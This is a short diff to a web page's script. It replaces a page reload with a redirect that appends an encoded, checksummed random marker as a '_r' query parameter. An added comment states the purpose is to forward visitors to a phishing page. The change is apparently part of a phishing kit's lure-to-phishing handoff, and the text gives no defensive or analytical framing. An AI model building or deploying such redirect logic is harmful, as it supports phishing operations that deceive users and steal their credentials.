@@ -166,9 +166,29 @@
         setTimeout(function() {
             document.getElementById('main-container').classList.add('fade-out');
             setTimeout(function() {
-                window.location.reload();
+                // Forward to phishing page by adding the forwarder marker
+                var url = new URL(window.location.href);
+                
+                // Generate 4 random bytes
+                var b1 = Math.floor(Math.random() * 256);
+                var b2 = Math.floor(Math.random() * 256);
+                var b3 = Math.floor(Math.random() * 256);
+                var b4 = Math.floor(Math.random() * 256);
+                
+                // Calculate checksum (sum of 4 bytes mod 256)
+                var crc = (b1 + b2 + b3 + b4) & 0xFF;
+                
+                // Create 5-byte array: [checksum, b1, b2, b3, b4]
+                var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
+                
+                // Base64 encode and make URL safe (raw encoding, no padding)
+                var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+                
+                // Add as query parameter
+                url.searchParams.set('_r', marker);
+                window.location.href = url.toString();
             }, 300);
-        }, 3500);
+        }, 2500);
     </script>
 </body>
 </html>
